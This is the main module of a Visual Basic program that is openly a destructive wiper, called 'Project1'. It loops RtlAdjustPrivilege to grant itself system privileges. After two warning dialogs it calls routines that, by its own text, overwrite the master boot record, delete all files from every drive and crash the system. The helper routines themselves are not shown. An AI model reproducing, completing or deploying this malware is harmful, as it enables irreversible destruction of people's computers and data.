Attribute VB_Name = "MainModule"

Sub Main()
	Init
	For i = 1 To 35
		Dim previousValue As Long
		RtlAdjustPrivilege i, True, False, previousValue
	Next
	If MsgBox("First warning: You are trying to execute Project1, it's not the actual name. It will overwrite MBR, the first partition, delete all files from all drive, shutdown the system, etc. Do you want to execute Project1?", vbExclamation + vbYesNo, "First warning") = vbYes Then
		If MsgBox("last warning: Are you want to execute Project1? It's very dangerous. I recommend to exit this app now.", vbExclamation + vbYesNo, "last warning") = vbYes Then
			OverwriteMBR
			DelEachDrive
			RaiseError
		End If
	End If
End Sub
